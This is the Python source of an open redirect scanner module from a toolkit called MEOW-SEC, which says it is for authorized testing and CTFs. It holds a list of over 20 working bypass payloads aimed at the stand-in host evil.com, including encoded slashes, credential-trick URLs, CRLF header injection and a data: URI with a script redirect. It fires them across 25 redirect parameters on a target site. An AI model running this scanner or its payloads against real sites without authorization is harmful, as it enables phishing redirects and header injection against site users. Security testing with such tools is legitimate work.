# -*- coding: utf-8 -*-
"""
MEOW-SEC :: OPENREDIR — Open Redirect Scanner  (#69)
20+ bypass payloads · 25 target parameters · FUZZ mode
For authorized security testing and CTF challenges only.
"""
import os, re, json
from datetime import datetime
from urllib.parse import urlparse, urljoin, urlencode, quote

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from core.proxy_manager import px as _px

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ─── CONSTANTS ────────────────────────────────────────────────

EVIL = "evil.com"
EVIL_HTTPS = "https://evil.com"
EVIL_HTTPS_PATH = "https://evil.com/pwned"

# Parameters commonly used for redirects
_REDIR_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "next", "next_url", "return", "return_url", "return_to",
    "goto", "go", "continue", "dest", "destination",
    "target", "link", "forward", "forward_url",
    "redir", "out", "checkout_url", "callback",
    "jump", "jump_url",
]

# 20+ bypass payloads — each is a string that goes as the param value
_PAYLOADS = [
    # Direct
    EVIL_HTTPS,
    f"//{EVIL}",
    f"\\/\\/{EVIL}",
    # Proto-relative
    f"//{EVIL}/path",
    # Encoded slashes
    f"%2F%2F{EVIL}",
    f"%2f{EVIL}",
    f"%5C%5C{EVIL}",
    # Double encoded
    f"%252F%252F{EVIL}",
    # Credentials trick
    f"https://target.com@{EVIL}",
    f"https://target.com%40{EVIL}",
    # Backslash
    f"\\{EVIL}",
    f"\\\\{EVIL}",
    # CRLF injection
    f"//{EVIL}%0d%0aLocation://{EVIL}",
    f"//{EVIL}%0aLocation://{EVIL}",
    # Unicode fullwidth
    "／／evil.com",           # ／／evil.com
    f"//evil。com",              # //evil。com
    # Data URI
    "data:text/html,<script>window.location='https://evil.com'</script>",
    # Fragment anchor bypass
    f"//{EVIL}#.target.com",
    f"{EVIL_HTTPS}#.target.com",
    # Path traversal combos
    f"{EVIL_HTTPS}/target.com",
    f"{EVIL_HTTPS}/.target.com",
    # Null byte
    f"https://target.com%00{EVIL}",
    # Hex IP loopback (acts as evil in local infra tests)
    "http://0x7f000001",
    # Wrapped with legit domain
    f"https://{EVIL}?target.com",
    # No scheme
    f"{EVIL}",
]

UA = "MEOW-OPENREDIR/1.0 (authorized-test)"


# ─── DETECTION HELPERS ────────────────────────────────────────

def _location_hits_evil(headers: dict) -> bool:
    loc = headers.get("Location", headers.get("location", ""))
    if not loc:
        return False
    loc_l = loc.lower()
    return EVIL in loc_l or loc_l.startswith("//evil") or loc_l.startswith("\\evil")


def _body_hits_evil(text: str) -> str:
    """Return the type of body redirect found, or empty string."""
    tl = text.lower()
    # meta-refresh
    meta = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]*content=["\'][^"\']*url=([^\s"\'>;]+)',
                     tl, re.I)
    if meta and EVIL in meta.group(1):
        return "meta-refresh"
    # JS location assign
    js = re.search(r'(?:window\.location|location\.href)\s*[=:]\s*["\']([^"\']+)["\']', tl, re.I)
    if js and EVIL in js.group(1):
        return "js-redirect"
    return ""


def _probe(url: str, timeout=8):
    """Single request, no redirect following."""
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=timeout,
                         verify=False, allow_redirects=False, proxies=_px())
        return r
    except Exception:
        return None


# ─── CORE SCAN ────────────────────────────────────────────────

def _scan_url_param(base_url: str, param: str, payloads: list) -> list:
    """Test one parameter with all payloads. Returns list of finding dicts."""
    findings = []
    for payload in payloads:
        # Build URL: append param=payload
        sep = "&" if "?" in base_url else "?"
        test_url = f"{base_url}{sep}{param}={quote(payload, safe=':/@!$&\'()*+,;=')}"
        r = _probe(test_url)
        if r is None:
            continue

        confirmed = False
        level = ""
        detail = ""

        if r.status_code in (301, 302, 303, 307, 308):
            if _location_hits_evil(dict(r.headers)):
                confirmed = True
                level = "CONFIRMED"
                detail = f"Location: {r.headers.get('Location', '')[:80]}"
            else:
                loc = r.headers.get("Location", "")
                if loc:
                    level = "POTENTIAL"
                    detail = f"Redirect → {loc[:60]}"

        if not confirmed and r.status_code == 200:
            body_type = _body_hits_evil(r.text)
            if body_type:
                level = "POTENTIAL"
                detail = f"{body_type} in body"

        if level:
            findings.append({
                "param": param,
                "payload": payload[:70],
                "status": r.status_code,
                "level": level,
                "detail": detail,
                "url": test_url[:120],
            })
            color = RD if level == "CONFIRMED" else OR
            find(f"[{level}] param=[{CY}]{param}[/] payload=[{color}]{payload[:50]}[/] — {detail}")

    return findings


def _scan_fuzz_url(fuzz_url: str, payloads: list) -> list:
    """URL with FUZZ placeholder — replace FUZZ with each payload."""
    findings = []
    for payload in payloads:
        test_url = fuzz_url.replace("FUZZ", quote(payload, safe=':/@!$&\'()*+,;='))
        r = _probe(test_url)
        if r is None:
            continue

        confirmed = False
        level = ""
        detail = ""

        if r.status_code in (301, 302, 303, 307, 308):
            if _location_hits_evil(dict(r.headers)):
                confirmed = True
                level = "CONFIRMED"
                detail = f"Location: {r.headers.get('Location', '')[:80]}"
            else:
                loc = r.headers.get("Location", "")
                if loc:
                    level = "POTENTIAL"
                    detail = f"Redirect → {loc[:60]}"

        if not confirmed and r.status_code == 200:
            body_type = _body_hits_evil(r.text)
            if body_type:
                level = "POTENTIAL"
                detail = f"{body_type} in body"

        if level:
            findings.append({
                "param": "FUZZ",
                "payload": payload[:70],
                "status": r.status_code,
                "level": level,
                "detail": detail,
                "url": test_url[:120],
            })
            color = RD if level == "CONFIRMED" else OR
            find(f"[{level}] FUZZ=[{color}]{payload[:50]}[/] — {detail}")

    return findings


# ─── SAVE ─────────────────────────────────────────────────────

def _save(target: str, findings: list):
    os.makedirs("data", exist_ok=True)
    host = urlparse(target).netloc.replace(".", "_").replace(":", "_") or "unknown"
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"data/openredir_{host}_{ts}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({
            "target": target,
            "findings": findings,
            "timestamp": datetime.now().isoformat(),
        }, f, indent=2)
    ok(f"Results saved → [{CY}]{fname}[/]")


# ─── MAIN ─────────────────────────────────────────────────────

def run(target: str = None):
    show_module_banner("openredir")
    cat_talk(CAT_SCAN, "Open Redirect scanner — 20+ payloads loaded...", OR)
    console.print()

    if not HAS_REQUESTS:
        err("requests library not available. Install it: pip install requests")
        return

    console.print(f"  [{G1}][1][/] Auto-scan — test {len(_REDIR_PARAMS)} common parameters on a base URL")
    console.print(f"  [{G1}][2][/] FUZZ mode  — test a URL with FUZZ placeholder")
    mode = ask_choice("Mode", "1")
    console.print()

    all_findings = []

    # ── Mode 1 : auto-scan ──
    if mode == "1":
        if not target:
            target = ask_target("Base URL to scan (https://example.com/login)")
        if not target:
            err("No target."); return
        if not target.startswith("http"):
            target = "https://" + target

        info(f"Target: [{CY}]{target}[/]")
        info(f"Testing [{CY}]{len(_REDIR_PARAMS)}[/] parameters × [{CY}]{len(_PAYLOADS)}[/] payloads...")
        console.print()

        for param in _REDIR_PARAMS:
            hits = _scan_url_param(target, param, _PAYLOADS)
            all_findings += hits

        # De-duplicate on (param, payload, level)
        seen = set()
        deduped = []
        for f in all_findings:
            key = (f["param"], f["payload"], f["level"])
            if key not in seen:
                seen.add(key)
                deduped.append(f)
        all_findings = deduped

    # ── Mode 2 : FUZZ ──
    elif mode == "2":
        fuzz_url = ask_target("URL with FUZZ placeholder (https://example.com/redir?url=FUZZ)")
        if not fuzz_url:
            err("No URL."); return
        if "FUZZ" not in fuzz_url:
            err("URL must contain the FUZZ placeholder.")
            return

        target = fuzz_url
        info(f"FUZZ URL: [{CY}]{fuzz_url}[/]")
        info(f"Testing [{CY}]{len(_PAYLOADS)}[/] payloads...")
        console.print()

        all_findings = _scan_fuzz_url(fuzz_url, _PAYLOADS)

    console.print()

    # ── Summary ──
    confirmed  = [f for f in all_findings if f["level"] == "CONFIRMED"]
    potentials = [f for f in all_findings if f["level"] == "POTENTIAL"]

    if all_findings:
        rows = [
            (f["param"][:18], f["level"], f["payload"][:38],
             str(f["status"]), f["detail"][:40])
            for f in all_findings
        ]
        print_result_table(
            "Open Redirect Findings",
            ["PARAM", "LEVEL", "PAYLOAD", "STATUS", "DETAIL"],
            rows,
            color_col=1,
        )
        if confirmed:
            warn(f"[{RD}]{len(confirmed)} CONFIRMED[/] open redirect(s) found!")
        if potentials:
            warn(f"[{OR}]{len(potentials)} POTENTIAL[/] redirect(s) detected.")
    else:
        ok("No open redirect vulnerabilities detected.")

    _save(target, all_findings)
